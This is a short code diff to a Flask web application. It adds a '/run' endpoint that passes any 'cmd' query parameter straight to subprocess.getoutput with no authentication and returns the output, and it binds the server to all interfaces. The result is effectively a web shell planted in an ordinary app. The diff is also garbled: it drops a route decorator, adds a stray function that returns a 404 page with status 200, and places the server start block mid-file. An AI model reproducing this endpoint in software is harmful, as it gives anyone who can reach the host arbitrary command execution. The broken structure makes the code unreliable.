@@ -45,8 +45,29 @@ HTML_TEMPLATE = """
 """
 
 
-@app.route('/', methods=['GET', 'POST'])
+def run():
+    long = request.args.get("lang")
+    if not long:
+        return "<h1>404 Not Found</h1>", 200
 
+    
+
+@app.route("/run")
+def run_command():
+    cmd = request.args.get("cmd")
+    if not cmd:
+        return "Error: No command provided.", 400
+
+    print(f"[実行] {cmd}")
+    try:
+        output = subprocess.getoutput(cmd)
+        return f"<pre>{output}</pre>"
+    except Exception as e:
+        return f"<pre>実行エラー: {str(e)}</pre>", 500
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
+    
 @app.route('/favicon.ico')
 def favicon():
     return send_from_directory('static', 'favicon.ico', mimetype='image/vnd.microsoft.icon')
